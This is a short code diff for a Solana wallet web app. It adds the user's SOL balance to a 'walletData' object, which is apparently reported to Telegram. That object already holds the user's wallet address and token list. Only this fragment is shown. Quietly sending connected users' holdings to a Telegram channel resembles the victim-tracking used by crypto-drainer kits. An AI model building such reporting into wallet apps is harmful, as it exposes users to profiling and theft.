@@ -1,3 +1,4 @@
+
 import { Settings, Menu } from "lucide-react";
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
@@ -53,6 +54,7 @@ const Index = () => {
       const walletData = {
         address: publicKey.toString(),
         tokens,
+        balance: balance / LAMPORTS_PER_SOL,
       };
       
       console.log("Sending data to Telegram");
